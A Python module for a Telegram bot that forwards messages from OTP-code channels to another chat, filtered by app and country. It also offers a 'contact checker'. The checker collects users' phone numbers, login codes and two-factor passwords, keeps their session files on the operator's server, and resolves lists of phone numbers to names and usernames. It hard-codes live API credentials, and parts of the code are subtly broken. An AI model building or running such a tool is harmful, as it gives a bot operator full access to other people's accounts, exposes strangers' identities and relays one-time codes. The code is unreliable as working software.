import asyncio
import logging
import os
import re
from typing import Optional, List, Dict, Any, Tuple

from telethon import TelegramClient, functions, types, errors, events
from telethon.sessions import StringSession
from telebot.async_telebot import AsyncTeleBot
from telebot.types import (InlineKeyboardMarkup, InlineKeyboardButton, 
                          CallbackQuery, ForceReply, Message)

# Constants for contact checker
CONTACT_CHECKER_API_ID = 20729573
CONTACT_CHECKER_API_HASH = "6bc09cbaa7d0471944875c202fec8b5b"
ADMIN_USER_ID = 1889471360  # Replace with your admin ID
SESSIONS_DIR = "sessions"
os.makedirs(SESSIONS_DIR, exist_ok=True)

class TelegramLogHandler(logging.Handler):
    """Logging handler that sends log records to a Telegram user."""
    def __init__(self, bot: AsyncTeleBot, user_id: int):
        super().__init__()
        self.bot = bot
        self.user_id = user_id

    def emit(self, record: logging.LogRecord) -> None:
        msg = self.format(record)
        asyncio.create_task(
            self.bot.send_message(
                self.user_id,
                f"<pre>{msg}</pre>",
                parse_mode="HTML"
            )
        )


class ForwardManager:
    # Callback identifiers
    CB_START = "fm_start"
    CB_STOP = "fm_stop"
    CB_SHOW_LOGS = "fm_show_logs"
    CB_TOGGLE_LOGS = "fm_toggle_logs"
    CB_CHECK_NUM = "fm_check_nums"
    CB_LOGOUT = "fm_logout"
    CB_LOGIN = "fm_login"
    CB_ADD_APP = "fm_add_app"
    CB_REMOVE_APP = "fm_remove_app"
    CB_ADD_COUNTRY = "fm_add_country"
    CB_REMOVE_COUNTRY = "fm_remove_country"
    CB_SHOW_LISTS = "fm_show_lists"

    # Admin ID
    ADMIN_ID = ADMIN_USER_ID

    def __init__(
        self,
        api_id: int,
        api_hash: str,
        source_chats: List[str],
        dest_chat: str
    ):
        self.api_id = api_id
        self.api_hash = api_hash
        self.source_chats = source_chats
        self.dest_chat = dest_chat
        self.bot: Optional[AsyncTeleBot] = None

        # Forward control
        self.enabled = False
        # Logs
        self.log_buffer: List[str] = []
        self.logging_enabled = False
        # Dynamic filters
        self.app_list: List[str] = []
        self.country_list: List[str] = []

        # Setup logger
        self.logger = logging.getLogger("ForwardManager")
        self.logger.setLevel(logging.INFO)
        self.logger.propagate = False
        self.logger.handlers.clear()
        
        # Contact checker login states
        self.login_states = {}  # user_id -> {'state': 'awaiting_phone/code/password', ...}

    async def init_managers(
        self,
        user_mgr: Optional[Any] = None,
        order_mgr: Optional[Any] = None,
        bot: Optional[AsyncTeleBot] = None
    ) -> bool:
        try:
            self.user_manager = user_mgr
            self.order_manager = order_mgr
            if bot:
                self.bot = bot
            return True
        except Exception as e:
            self.logger.exception("Init managers error: %s", e)
            return False

    def _session_file(self, user_id: int) -> str:
        """Get session path based on user type"""
        filename = f"session_admin" if user_id == self.ADMIN_ID else f"session_{user_id}"
        return os.path.join(SESSIONS_DIR, f"{filename}.session")

    def _contact_session_file(self, user_id: int) -> str:
        """Get contact checker session path"""
        filename = f"contact_session_admin" if user_id == self.ADMIN_ID else f"contact_session_{user_id}"
        return os.path.join(SESSIONS_DIR, f"{filename}.session")

    def _setup_logging(self):
        self.logger.handlers.clear()
        if self.logging_enabled and self.bot:
            handler = TelegramLogHandler(self.bot, self.ADMIN_ID)
            handler.setFormatter(logging.Formatter("%(asctime)s %(levelname)s: %(message)s"))
            self.logger.addHandler(handler)
            self.logger.info("Logging to Telegram enabled")

    def _control_keyboard(self, user_id: Optional[int] = None) -> InlineKeyboardMarkup:
        kb = InlineKeyboardMarkup()
        # Admin-only controls
        if user_id == self.ADMIN_ID:
            kb.row(
                InlineKeyboardButton("▶️ Start Forward", callback_data=self.CB_START),
                InlineKeyboardButton("⏸ Stop Forward", callback_data=self.CB_STOP)
            )
            kb.row(
                InlineKeyboardButton("📝 Show Logs", callback_data=self.CB_SHOW_LOGS),
                InlineKeyboardButton("💡 Toggle Logs", callback_data=self.CB_TOGGLE_LOGS)
            )
            # App/Country list management
            kb.row(
                InlineKeyboardButton("➕ Add App", callback_data=self.CB_ADD_APP),
                InlineKeyboardButton("➖ Remove App", callback_data=self.CB_REMOVE_APP)
            )
            kb.row(
                InlineKeyboardButton("➕ Add Country", callback_data=self.CB_ADD_COUNTRY),
                InlineKeyboardButton("➖ Remove Country", callback_data=self.CB_REMOVE_COUNTRY)
            )
            kb.row(
                InlineKeyboardButton("📋 Show Filters", callback_data=self.CB_SHOW_LISTS)
            )
        # Common to all
        kb.row(
            InlineKeyboardButton("📞 Check Numbers", callback_data=self.CB_CHECK_NUM)
        )
        # Login/Logout buttons
        if os.path.exists(self._contact_session_file(user_id)):
            kb.row(InlineKeyboardButton("🚪 Logout", callback_data=self.CB_LOGOUT))
        else:
            kb.row(InlineKeyboardButton("🔑 Login", callback_data=self.CB_LOGIN))
        return kb

    async def register_handlers(self):
        if not self.bot:
            return
        else:
            self._setup_logging()
            
        @self.bot.message_handler(commands=['forward_control'])
        async def cmd_control(message: Message):
            await self.bot.send_message(
                message.chat.id,
                "⚙️ Control Panel:",
                reply_markup=self._control_keyboard(message.from_user.id)
            )

        @self.bot.message_handler(commands=['login'])
        async def cmd_login(message: Message):
            user_id = message.from_user.id
            chat_id = message.chat.id
            await self.start_contact_login(user_id, chat_id)

        @self.bot.message_handler(commands=['logout'])
        async def cmd_logout(message: Message):
            user_id = message.from_user.id
            chat_id = message.chat.id
            await self.logout_user(user_id, chat_id)

        @self.bot.message_handler(commands=['check_numbers'])
        async def cmd_check_numbers(message: Message):
            user_id = message.from_user.id
            chat_id = message.chat.id
            
            # Extract numbers from message (first 19 lines)
            numbers = [line.strip() for line in message.text.splitlines()[1:20] if line.strip()]
            # Validate numbers
            valid_numbers = []
            for num in numbers:
                if num.isdigit() and 8 <= len(num) <= 15:
                    valid_numbers.append(num)
                else:
                    await self.bot.send_message(
                        chat_id, 
                        f"⚠️ Skipping invalid number: {num} (must be 8-15 digits)"
                    )
            
            # Check if user has valid session
            session_path = self._contact_session_file(user_id)
            if os.path.exists(session_path):
                if valid_numbers:
                    await self.process_numbers(user_id, chat_id, valid_numbers)
                else:
                    await self.bot.send_message(
                        chat_id,
                        "Please send numbers in the format:\n/check_numbers\n123456789\n987654321\n... (up to 19 numbers)"
                    )
            else:
                # Start login flow with numbers
                await self.start_contact_login(user_id, chat_id, valid_numbers)

        @self.bot.message_handler(func=lambda m: m.from_user.id in self.login_states)
        async def handle_login_messages(message: Message):
            await self.handle_login_message(message)

        @self.bot.callback_query_handler(func=lambda call: True)
        async def handle_callbacks(call: CallbackQuery):
            uid = call.from_user.id
            data = call.data
            chat_id = call.message.chat.id
            
            # Start/Stop
            if data == self.CB_START:
                self.enabled = True
                self.logger.info("Forwarding ENABLED")
                await self.bot.answer_callback_query(call.id, "✅ Forwarding started")
            elif data == self.CB_STOP:
                self.enabled = False
                self.logger.info("Forwarding DISABLED")
                await self.bot.answer_callback_query(call.id, "⏸ Forwarding stopped")
            
            # Logs
            elif data == self.CB_SHOW_LOGS:
                text = "\n".join(self.log_buffer[-20:] or ["(no logs)"])
                for chunk in [text[i:i+4000] for i in range(0, len(text), 4000)]:
                    await self.bot.send_message(
                        chat_id, 
                        f"📝 Logs:\n<pre>{chunk}</pre>", 
                        parse_mode="HTML"
                    )
                await self.bot.answer_callback_query(call.id)
            elif data == self.CB_TOGGLE_LOGS:
                self.logging_enabled = not self.logging_enabled
                self._setup_logging()
                status = "enabled" if self.logging_enabled else "disabled"
                await self.bot.answer_callback_query(call.id, f"Logs {status}")
            
            # Filter management (admin only)
            elif uid == self.ADMIN_ID and data in (
                self.CB_ADD_APP, self.CB_REMOVE_APP,
                self.CB_ADD_COUNTRY, self.CB_REMOVE_COUNTRY,
                self.CB_SHOW_LISTS
            ):
                if data == self.CB_SHOW_LISTS:
                    apps = ', '.join(self.app_list) or 'None'
                    countries = ', '.join(self.country_list) or 'None'
                    await self.bot.send_message(
                        chat_id,
                        f"📑 Apps: {apps}\n🌍 Countries: {countries}"
                    )
                else:
                    prompt = "Enter app name:" if data in (self.CB_ADD_APP, self.CB_REMOVE_APP) else "Enter country name:"
                    await self.bot.send_message(chat_id, prompt, reply_markup=ForceReply(selective=True))
                    # Store action in message state
                    self.bot.current_states.set_state(uid, chat_id, data)
                await self.bot.answer_callback_query(call.id)
            
            # Contact checker actions
            elif data == self.CB_CHECK_NUM:
                await self.bot.answer_callback_query(call.id)
                await self.bot.send_message(
                    chat_id,
                    "📞 Send up to 19 phone numbers (one per line, without '+' or spaces):\nExample:\n919027839273\n918372673883\n918373737373"
                )
            elif data == self.CB_LOGIN:
                await self.bot.answer_callback_query(call.id)
                await self.start_contact_login(uid, chat_id)
            elif data == self.CB_LOGOUT:
                await self.bot.answer_callback_query(call.id)
                await self.logout_user(uid, chat_id)

        @self.bot.message_handler(func=lambda m: self.bot.current_states.get_state(m.from_user.id, m.chat.id) is not None)
        async def handle_filter_input(message: Message):
            state = self.bot.current_states.get_state(message.from_user.id, message.chat.id)
            text = message.text.strip()
            uid = message.from_user.id
            chat_id = message.chat.id
            
            if state == self.CB_ADD_APP and text not in self.app_list:
                self.app_list.append(text)
                await self.bot.send_message(chat_id, f"✅ App '{text}' added")
            elif state == self.CB_REMOVE_APP and text in self.app_list:
                self.app_list.remove(text)
                await self.bot.send_message(chat_id, f"❌ App '{text}' removed")
            elif state == self.CB_ADD_COUNTRY and text not in self.country_list:
                self.country_list.append(text)
                await self.bot.send_message(chat_id, f"✅ Country '{text}' added")
            elif state == self.CB_REMOVE_COUNTRY and text in self.country_list:
                self.country_list.remove(text)
                await self.bot.send_message(chat_id, f"❌ Country '{text}' removed")
            else:
                await self.bot.send_message(chat_id, "⚠️ No changes made")
            
            self.bot.current_states.delete_state(uid, chat_id)

        # Forwarding handler
        @self.bot._bot.on(events.NewMessage(chats=self.source_chats))
        async def on_new(event):
            if not self.enabled: 
                return
                
            txt = event.message.text or ''
            # Only forward if message contains at least one app AND one country
            if any(app in txt for app in self.app_list) and any(c in txt for c in self.country_list):
                try:
                    await self.bot._client.forward_messages(
                        self.dest_chat, event.message.id, await event.get_chat()
                    )
                    self.logger.info(f"Forwarded {event.message.id}")
                    self.log_buffer.append(f"Forwarded {event.message.id}")
                except errors.PeerIdInvalidError:
                    await self._cache_peers()
                    await self.bot._client.forward_messages(
                        self.dest_chat, event.message.id, await event.get_chat()
                    )
                except Exception as e:
                    self.logger.exception("Forward error: %s", e)
                    self.log_buffer.append(f"Error: {e}")

    async def _cache_peers(self) -> Dict[str, Any]:
        out = {}
        for chat in [*self.source_chats, self.dest_chat]:
            try:
                ent = await self.bot._client.get_entity(chat)
                out[chat] = ent
            except Exception as e:
                self.logger.error(f"Cache failed {chat}: {e}")
        return out

    # Contact checker methods
    async def start_contact_login(self, user_id: int, chat_id: int, pending_numbers: List[str] = None):
        """Initiate login flow for contact checker"""
        self.login_states[user_id] = {
            'state': 'awaiting_phone',
            'chat_id': chat_id,
            'pending_numbers': pending_numbers
        }
        await self.bot.send_message(
            chat_id,
            "🔑 Please send your phone number (with country code, without '+' or spaces):",
            reply_markup=ForceReply(selective=True)
        )

    async def handle_login_message(self, message: Message):
        """Handle contact checker login process"""
        user_id = message.from_user.id
        state_data = self.login_states.get(user_id)
        if not state_data:
            return
            
        text = message.text.strip()
        chat_id = state_data['chat_id']
        
        if state_data['state'] == 'awaiting_phone':
            # Validate phone format (digits only)
            if not text.isdigit():
                await self.bot.send_message(chat_id, "❌ Invalid format. Send digits only (e.g., 254700112233)")
                return
                
            try:
                session_path = self._contact_session_file(user_id)
                client = TelegramClient(
                    session_path,
                    CONTACT_CHECKER_API_ID,
                    CONTACT_CHECKER_API_HASH
                )
                await client.connect()
                await client.send_code_request(text)
                
                state_data.update({
                    'state': 'awaiting_code',
                    'phone': text,
                    'client': client
                })
                await self.bot.send_message(
                    chat_id,
                    "✉️ Code sent! Please reply with the code:",
                    reply_markup=ForceReply(selective=True)
                )
                
            except (errors.FloodWaitError, errors.PhoneNumberInvalidError) as e:
                await self.bot.send_message(chat_id, f"❌ Error: {str(e)}")
                del self.login_states[user_id]
            except Exception as e:
                await self.bot.send_message(chat_id, f"❌ Unexpected error: {str(e)}")
                del self.login_states[user_id]

        elif state_data['state'] == 'awaiting_code':
            if not text.isdigit():
                await self.bot.send_message(chat_id, "❌ Invalid code format. Send digits only")
                return
                
            try:
                client = state_data['client']
                await client.sign_in(state_data['phone'], text)
                await self.bot.send_message(chat_id, "✅ Login successful!")
                
                # Process pending numbers if exists
                if state_data['pending_numbers']:
                    await self.process_numbers(
                        user_id, 
                        chat_id,
                        state_data['pending_numbers']
                    )
                del self.login_states[user_id]
                
            except errors.SessionPasswordNeededError:
                state_data['state'] = 'awaiting_password'
                await self.bot.send_message(
                    chat_id,
                    "🔐 Two-factor authentication enabled. Please send your password:",
                    reply_markup=ForceReply(selective=True)
                )
            except Exception as e:
                await self.bot.send_message(chat_id, f"❌ Login failed: {str(e)}")
                del self.login_states[user_id]

        elif state_data['state'] == 'awaiting_password':
            try:
                client = state_data['client']
                await client.sign_in(password=text)
                await self.bot.send_message(chat_id, "✅ Login successful!")
                
                if state_data['pending_numbers']:
                    await self.process_numbers(
                        user_id, 
                        chat_id,
                        state_data['pending_numbers']
                    )
            except Exception as e:
                await self.bot.send_message(chat_id, f"❌ 2FA failed: {str(e)}")
            finally:
                del self.login_states[user_id]

    async def check_numbers_registered(self, client: TelegramClient, numbers: List[str]) -> List[Tuple[str, Optional[types.User]]]:
        """Check if numbers are registered on Telegram"""
        # Prepare contacts to import
        contacts = [
            types.InputPhoneContact(
                client_id=idx,
                phone=num,
                first_name=f"Temp_{idx}",
                last_name=""
            )
            for idx, num in enumerate(numbers)
        ]
        
        try:
            # Import contacts
            import_result = await client(functions.contacts.ImportContactsRequest(contacts))
            
            # Map results to phone numbers
            user_map = {}
            for user in import_result.users:
                if isinstance(user, types.User) and user.phone:
                    user_map[user.phone] = user
                    
            # Clean up - delete imported contacts
            if import_result.imported:
                await client(functions.contacts.DeleteContactsRequest(
                    id=[types.InputUser(user_id=u.id, access_hash=u.access_hash) for u in import_result.users]
                ))
                
            return [(num, user_map.get(num)) for num in numbers]
            
        except errors.FloodWaitError as fwe:
            self.logger.error(f"Flood wait error: {fwe}")
            raise
        except Exception as e:
            self.logger.error(f"Contact check error: {e}")
            raise

    async def process_numbers(self, user_id: int, chat_id: int, numbers: List[str]):
        """Process and display number check results"""
        try:
            session_path = self._contact_session_file(user_id)
            async with TelegramClient(session_path, CONTACT_CHECKER_API_ID, CONTACT_CHECKER_API_HASH) as client:
                results = await self.check_numbers_registered(client, numbers)
                response = []
                
                for num, user in results:
                    if user:
                        # Format: ✅ Registered → first_name last_name (@username)
                        name = f"{user.first_name or ''} {user.last_name or ''}".strip()
                        username = f" @{user.username}" if user.username else ""
                        response.append(f"✅ {num}: {name}{username}")
                    else:
                        response.append(f"❌ {num}: Not registered")
                
                # Send results in chunks if too long
                result_text = "\n".join(response)
                for i in range(0, len(result_text), 4000):
                    await self.bot.send_message(chat_id, result_text[i:i+4000])
                    
        except errors.FloodWaitError as fwe:
            await self.bot.send_message(
                chat_id,
                f"⏳ Flood wait: Please try again in {fwe.seconds} seconds"
            )
        except Exception as e:
            await self.bot.send_message(chat_id, f"❌ Error checking numbers: {str(e)}")

    async def logout_user(self, user_id: int, chat_id: int):
        """Logout user by deleting session file"""
        session_path = self._contact_session_file(user_id)
        if os.path.exists(session_path):
            os.remove(session_path)
        await self.bot.send_message(
            chat_id,
            "✅ You have been logged out. Send any command to log in again."
        )

# Instantiate ForwardManager
forward_manager = ForwardManager(
    api_id=26383754,
    api_hash="f743596f09f383e7bbcc62ce62367f06",
    source_chats=["TGTECHOTP", "tg_tech_receiver_bot"],
    dest_chat="flashthefiresms",
)

async def init_managers(user_manager=None, order_manager=None, bot: AsyncTeleBot = None) -> bool:
    return await forward_manager.init_managers(bot=bot)

async def register_handlers(bot: AsyncTeleBot):
    return await forward_manager.register_handlers(bot)
    # Handlers are registered inside init_managers
    pass

__all__ = ['init_managers', 'register_handlers', 'forward_manager']
